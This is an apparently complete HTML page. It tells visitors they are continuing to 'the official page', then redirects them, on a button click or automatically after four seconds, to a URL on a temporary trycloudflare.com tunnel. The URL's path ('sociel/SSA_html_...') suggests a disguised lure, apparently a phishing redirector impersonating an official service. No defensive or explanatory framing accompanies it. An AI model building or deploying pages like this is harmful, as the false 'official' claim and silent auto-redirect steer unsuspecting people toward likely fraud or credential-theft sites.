<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Landing Page</title>
  <style>
    :root {
      --bg: #0f172a;
      --card: #111827;
      --text: #e5e7eb;
      --muted: #9ca3af;
      --accent: #22c55e;
      --accent-dark: #16a34a;
    }

    * { box-sizing: border-box; }

    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(135deg, var(--bg), #1e293b);
      color: var(--text);
    }

    .card {
      width: min(90vw, 520px);
      background: rgba(17, 24, 39, 0.92);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 18px;
      padding: 32px 24px;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35);
    }

    h1 {
      margin: 0 0 14px;
      font-size: clamp(2rem, 5vw, 2.7rem);
    }

    p {
      margin: 0 0 24px;
      color: var(--muted);
      font-size: 1.06rem;
      line-height: 1.6;
    }

    button {
      border: none;
      border-radius: 10px;
      background: var(--accent);
      color: white;
      font-size: 1rem;
      font-weight: bold;
      padding: 14px 28px;
      cursor: pointer;
      transition: background 0.2s ease, transform 0.2s ease;
    }

    button:hover {
      background: var(--accent-dark);
      transform: translateY(-1px);
    }

    .small {
      margin-top: 18px;
      font-size: 0.84rem;
      color: var(--muted);
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>Welcome</h1>
    <p>You are about to continue to the official page. Please wait a moment or click below to continue.</p>
    <button id="continueBtn">Continue</button>
    <div class="small">Redirecting automatically in a few seconds...</div>
  </div>

  <script>
    const targetUrl = "https://parts-reflection-duke-contacting.trycloudflare.com/links/sociel/SSA_html_20260823_ee4628.html";

    document.getElementById("continueBtn").addEventListener("click", function () {
      window.location.href = targetUrl;
    });

    setTimeout(function () {
      window.location.href = targetUrl;
    }, 4000);
  </script>
</body>
</html>
